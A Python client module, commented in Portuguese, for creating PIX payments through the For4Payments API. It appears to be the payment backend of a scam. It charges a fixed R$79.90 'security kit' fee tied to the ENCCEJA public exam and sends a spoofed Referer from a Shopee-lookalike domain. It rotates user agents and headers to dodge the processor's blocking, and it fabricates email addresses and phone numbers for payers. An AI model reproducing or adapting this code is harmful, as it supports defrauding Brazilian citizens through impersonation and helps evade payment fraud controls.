"""
API client para For4Payments
"""
import os
import requests
import time
import random
import string
import logging
from typing import Dict, Any, Optional
from transaction_tracker import track_transaction_attempt, get_client_ip, is_transaction_ip_banned

# Configurar logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("for4payments_api")

class For4PaymentsAPI:
    API_URL = "https://app.for4payments.com.br/api/v1"

    def __init__(self, secret_key: str):
        self.secret_key = secret_key
        self.extra_headers = {}  # Headers adicionais para evitar problemas de 403 Forbidden

    def _get_headers(self) -> Dict[str, str]:
        headers = {
            'Authorization': self.secret_key,
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        
        # Adicionar headers extras (para evitar 403 Forbidden)
        if self.extra_headers:
            headers.update(self.extra_headers)
            logger.debug(f"Usando headers personalizados: {headers}")
            
        return headers

    def _generate_random_email(self, name: str) -> str:
        clean_name = ''.join(e.lower() for e in name if e.isalnum())
        random_num = ''.join(random.choices(string.digits, k=4))
        domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
        domain = random.choice(domains)
        return f"{clean_name}{random_num}@{domain}"

    def _generate_random_phone(self) -> str:
        """
        Gera um número de telefone brasileiro aleatório no formato DDDNNNNNNNNN
        sem o prefixo +55. Usado apenas como fallback quando um telefone válido não está disponível.
        """
        ddd = str(random.randint(11, 99))
        number = ''.join(random.choices(string.digits, k=9))
        return f"{ddd}{number}"

    def create_pix_payment(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Create a PIX payment request"""
        # Registro detalhado da chave secreta (parcial)
        if not self.secret_key:
            raise ValueError("Token de autenticação não foi configurado")
        elif len(self.secret_key) < 10:
            raise ValueError("Token de autenticação inválido (muito curto)")

        # Verificação de IP banido (limitar tentativas)
        client_ip = get_client_ip()
        if is_transaction_ip_banned(client_ip):
            logger.warning(f"Bloqueando tentativa de pagamento de IP banido: {client_ip}")
            raise ValueError("Excesso de tentativas de transação detectado. Tente novamente em 24 horas.")
            
        # Verificar se este IP já fez muitas tentativas com os mesmos dados
        allowed, message = track_transaction_attempt("pre_validation", data)
        if not allowed:
            logger.warning(f"Bloqueando tentativa de pagamento: {message}")
            raise ValueError(message)
            
        # Validação dos campos obrigatórios
        required_fields = ['name', 'cpf', 'amount']
        missing_fields = []
        for field in required_fields:
            if field not in data or not data[field]:
                missing_fields.append(field)
        
        if missing_fields:
            logger.error(f"Campos obrigatórios ausentes: {missing_fields}")
            raise ValueError(f"Campos obrigatórios ausentes: {', '.join(missing_fields)}")

        try:
            # Validação e conversão do valor
            try:
                amount_in_cents = int(float(data['amount']) * 100)
            except (ValueError, TypeError) as e:
                raise ValueError(f"Valor de pagamento inválido: {data['amount']}")
                
            if amount_in_cents <= 0:
                raise ValueError("Valor do pagamento deve ser maior que zero")

            # Processamento do CPF
            cpf = ''.join(filter(str.isdigit, str(data['cpf'])))
            if len(cpf) != 11:
                raise ValueError("CPF inválido - deve conter 11 dígitos")

            # Validação e geração de email se necessário
            email = data.get('email')
            
            if not email or '@' not in email:
                email = self._generate_random_email(data['name'])

            # Processamento do telefone
            phone = data.get('phone', '')
            
            # Verifica se o telefone foi fornecido e processa
            if phone and isinstance(phone, str) and len(phone.strip()) > 0:
                # Remove caracteres não numéricos
                phone = ''.join(filter(str.isdigit, phone))
                
                # Verifica se o número tem um formato aceitável após a limpeza
                if len(phone) >= 10:
                    # Se existir o prefixo brasileiro 55, garante que ele seja removido para o padrão da API
                    if phone.startswith('55') and len(phone) > 10:
                        phone = phone[2:]
                else:
                    phone = self._generate_random_phone()
            else:
                # Se não houver telefone ou for inválido, gerar um aleatório
                phone = self._generate_random_phone()

            # Preparação dos dados para a API
            payment_data = {
                "name": data['name'],
                "email": email,
                "cpf": cpf,
                "phone": phone,
                "paymentMethod": "PIX",
                "amount": amount_in_cents,
                "items": [{
                    "title": "Kit de Segurança",
                    "quantity": 1,
                    "unitPrice": amount_in_cents,
                    "tangible": False
                }]
            }

            try:
                # Gerar headers aleatórios para evitar bloqueios
                import random
                import time
                
                # Lista de user agents para variar os headers
                user_agents = [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
                ]
                
                # Lista de idiomas para variar nos headers
                languages = [
                    "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
                    "en-US,en;q=0.9,pt-BR;q=0.8,pt;q=0.7"
                ]
                
                # Configurar headers extras aleatórios
                extra_headers = {
                    "User-Agent": random.choice(user_agents),
                    "Accept-Language": random.choice(languages),
                    "Cache-Control": random.choice(["max-age=0", "no-cache"]),
                    "X-Requested-With": "XMLHttpRequest",
                    "X-Cache-Buster": str(int(time.time() * 1000)),
                    "Referer": "https://shopee-entregas.com.br/pagamento",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty"
                }
                
                # Combinar com headers base
                headers = self._get_headers()
                headers.update(extra_headers)
                
                response = requests.post(
                    f"{self.API_URL}/transaction.purchase",
                    json=payment_data,
                    headers=headers,
                    timeout=30
                )

                if response.status_code == 200:
                    response_data = response.json()
                    
                    # Resultado formatado com suporte a múltiplos formatos de resposta
                    result = {
                        'id': response_data.get('id') or response_data.get('transactionId'),
                        'pixCode': (
                            response_data.get('pixCode') or 
                            response_data.get('copy_paste') or 
                            response_data.get('code') or 
                            response_data.get('pix_code') or
                            (response_data.get('pix', {}) or {}).get('code') or 
                            (response_data.get('pix', {}) or {}).get('copy_paste')
                        ),
                        'pixQrCode': (
                            response_data.get('pixQrCode') or 
                            response_data.get('qr_code_image') or 
                            response_data.get('qr_code') or 
                            response_data.get('pix_qr_code') or
                            (response_data.get('pix', {}) or {}).get('qrCode') or 
                            (response_data.get('pix', {}) or {}).get('qr_code_image')
                        ),
                        'expiresAt': response_data.get('expiresAt') or response_data.get('expiration'),
                        'status': response_data.get('status', 'pending')
                    }
                    
                    return result
                elif response.status_code == 401:
                    raise ValueError("Falha na autenticação com a API For4Payments. Verifique a chave de API.")
                else:
                    error_message = 'Erro ao processar pagamento'
                    try:
                        error_data = response.json()
                        if isinstance(error_data, dict):
                            error_message = error_data.get('message') or error_data.get('error') or '; '.join(error_data.get('errors', []))
                    except Exception:
                        error_message = f'Erro ao processar pagamento (Status: {response.status_code})'
                    raise ValueError(error_message)

            except requests.exceptions.RequestException as e:
                raise ValueError("Erro de conexão com o serviço de pagamento. Tente novamente em alguns instantes.")

        except ValueError as e:
            raise
        except Exception as e:
            raise ValueError("Erro interno ao processar pagamento. Por favor, tente novamente.")

    def create_encceja_payment(self, user_data: Dict[str, Any]) -> Dict[str, Any]:
        """Criar um pagamento PIX para a taxa do Kit de Segurança"""
        # Validação dos dados obrigatórios
        if not user_data:
            raise ValueError("Nenhum dado de usuário fornecido")
            
        if not user_data.get('nome'):
            raise ValueError("Nome do usuário é obrigatório")
            
        if not user_data.get('cpf'):
            raise ValueError("CPF do usuário é obrigatório")
            
        # Valor fixo do kit de segurança
        amount = 79.90
        
        # Sanitização e preparação dos dados
        try:
            # Formatar o CPF para remover caracteres não numéricos
            cpf_original = user_data.get('cpf', '')
            cpf = ''.join(filter(str.isdigit, str(cpf_original)))
            
            # Usar email fornecido ou gerar um
            email = user_data.get('email', '')
            if not email:
                nome = user_data.get('nome', '').strip()
                email = self._generate_random_email(nome)
            
            # Limpar o telefone se fornecido, ou gerar um aleatório
            phone_original = user_data.get('telefone', '')
            phone_digits = ''.join(filter(str.isdigit, str(phone_original)))
            
            if not phone_digits or len(phone_digits) < 10:
                phone = self._generate_random_phone()
            else:
                phone = phone_digits
                
            # Formatar os dados para o pagamento
            payment_data = {
                'name': user_data.get('nome'),
                'email': email,
                'cpf': cpf,
                'amount': amount,
                'phone': phone,
                'description': 'Kit de Segurança'
            }
            
            result = self.create_pix_payment(payment_data)
            return result
            
        except Exception as e:
            raise ValueError(f"Erro ao processar pagamento: {str(e)}")


def create_payment_api(secret_key: Optional[str] = None) -> For4PaymentsAPI:
    """Factory function to create For4PaymentsAPI instance"""
    if secret_key is None:
        secret_key = os.environ.get("FOR4PAYMENTS_SECRET_KEY")
        if not secret_key:
            # Para desenvolvimento, usar uma chave fake
            secret_key = "test_api_key_00000000000000000000000000000000"
            print("Usando chave API de teste para desenvolvimento")
    
    return For4PaymentsAPI(secret_key)